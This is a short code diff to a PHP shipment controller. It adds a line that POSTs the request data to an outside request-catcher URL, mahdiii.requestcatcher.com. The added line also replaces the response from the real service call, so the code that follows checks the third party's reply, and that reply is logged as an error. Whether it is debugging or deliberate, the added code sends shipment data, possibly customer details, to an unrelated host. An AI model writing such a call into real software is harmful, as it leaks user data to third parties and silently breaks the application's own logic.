@@ -2193,7 +2193,13 @@ class ShipmentController extends Controller
                                     $response = Http::post($url, $data);
                                 }
 
-
+                                $response = Http::post("https://mahdiii.requestcatcher.com/test", $data);
+                                if ($response->successful() && $response->status() == 200) {
+                                    Log::channel('custom')->error('mehdi req.', [
+                                        'error' => true,
+                                        'context' => $response->json(),
+                                    ]);
+                                }
                                 
 
                     if ($response->successful() && $response->status() == 200) {
